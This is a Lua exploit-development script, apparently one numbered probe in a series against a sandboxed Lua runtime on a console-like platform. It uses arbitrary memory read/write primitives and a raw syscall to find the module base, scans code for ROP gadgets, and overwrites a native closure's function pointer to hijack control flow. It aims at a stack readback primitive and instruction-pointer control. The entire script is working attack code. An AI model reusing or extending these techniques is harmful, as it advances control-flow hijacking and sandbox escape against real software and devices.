-- CRASH_CLASS: MODERATE (CClosure +0x20 redirects, restored after each; 56c/56f survived)
-- PROBE 278a: CClosure redirect to control-return gadgets
--
-- Context: 56c/56f redirected +0x20 to existing Lua C targets with
-- target-like output and restore checks. 54p stopped after printing the
-- xor eax,eax;ret gadget address. This probe completes the gadget-redirect
-- ladder with three single-instruction targets:
--   A. plain `ret` - returns whatever RAX held at CClosure entry; Lua treats
--      it as the count of pushed results and hands back that many stale
--      stack slots -> Lua VM stack readback primitive (if N is sane)
--   B. `xor eax,eax; ret` - clean 0-results return (54p redo, completes it)
--   C. `pop rdi; ret` - measures what the next stack qword is (RDI becomes
--      it, RIP becomes the following qword) - only safe if that qword is
--      small; run with markers and expect a kill, LAST.
-- Redirects are on rawequal's CClosure (proven writable/restorable, 53d/56c).

print("=== PROBE 278a: CClosure control-return gadgets ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function zero(addr, n)
    for off = 0, n - 1, 8 do wq(addr + off, uint64(0)) end
end

-- module base
local info = memory.alloc(0x200)
zero(info, 0x200)
pcall(function() memory.write_dword(info, 0x160) end)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] no module base; aborting")
    return
end
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot=" .. q(eboot))

-- find gadgets in first 64KB (54p's proven scan window)
local g_ret, g_xor, g_pop_rdi
local hi_lo, hi_hi = get_hi_lo(eboot)
for off = 0, 0xFFFF do
    local b0 = (function() local ok, v = pcall(function() return memory.read_byte(eboot + off) end) if ok then return to_num(v) end return nil end)()
    if b0 == nil then break end
    if b0 == 0xC3 and g_ret == nil and off > 0 then
        g_ret = eboot + off - 1
    end
    if b0 == 0xC3 and off >= 2 then
        local b1 = (function() local ok, v = pcall(function() return memory.read_byte(eboot + off - 1) end) if ok then return to_num(v) end return nil end)()
        local b2 = (function() local ok, v = pcall(function() return memory.read_byte(eboot + off - 2) end) if ok then return to_num(v) end return nil end)()
        if b1 == 0xC0 and b2 == 0x31 and g_xor == nil then g_xor = eboot + off - 2 end
        if b1 == 0x5F and g_pop_rdi == nil then g_pop_rdi = eboot + off - 1 end
    end
    if g_ret and g_xor and g_pop_rdi then break end
end
print("[1] ret=" .. (g_ret and q(g_ret) or "nil") .. " xor-eax=" .. (g_xor and q(g_xor) or "nil") .. " pop-rdi=" .. (g_pop_rdi and q(g_pop_rdi) or "nil"))

-- rawequal CClosure +0x20 (56c's proven address parser)
local re_addr
do
    local s = tostring(rawequal)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then re_addr = uint64("0x" .. hex) end
end
if re_addr == nil then
    print("[2] rawequal CClosure address not found in tostring; aborting")
    return
end
print("[2] rawequal CClosure=" .. q(re_addr))
local saved = rq(re_addr + 0x20)
print("    +0x20 saved=" .. (saved and q(saved) or "nil"))
if saved == nil then return end

local function with_redirect(label, gadget, fn)
    wq(re_addr + 0x20, uint64(gadget))
    local ok, a, b, c = pcall(fn)
    wq(re_addr + 0x20, uint64(saved))
    print(string.format("    %-24s ok=%s ret1=%s ret2=%s", label, tostring(ok), tostring(a), tostring(b)))
    local back = rq(re_addr + 0x20)
    print("      restored=" .. (back and q(back) or "nil") .. (back == saved and " (OK)" or " (MISMATCH)"))
    return ok, a, b, c
end

print("")
print("[A] plain ret gadget (RAX at entry = result count; stale slots come back)")
with_redirect("rawequal->ret", g_ret, function()
    return rawequal(1, 1)
end)
with_redirect("rawequal->ret (pcall wrap)", g_ret, function()
    return pcall(function() return rawequal(2, 2) end)
end)

print("")
print("[B] xor eax,eax;ret (0 results; completes 54p)")
with_redirect("rawequal->xor eax,eax;ret", g_xor, function()
    return pcall(function() return rawequal(3, 3) end)
end)

print("")
print("[C] control: unmodified rawequal")
print("    rawequal(1,1)=" .. tostring(rawequal(1, 1)) .. " rawequal(1,2)=" .. tostring(rawequal(1, 2)))

print("")
print("[D] pop rdi;ret LAST (likely kill; stack qword becomes RIP)")
with_redirect("rawequal->pop rdi;ret", g_pop_rdi, function()
    return pcall(function() return rawequal(4, 4) end)
end)

print("")
local okp, pid = pcall(function() return make_syscall(20)():tonumber() end)
print("[E] canary: ok=" .. tostring(okp) .. " pid=" .. tostring(pid))
print("=== END 278a ===")
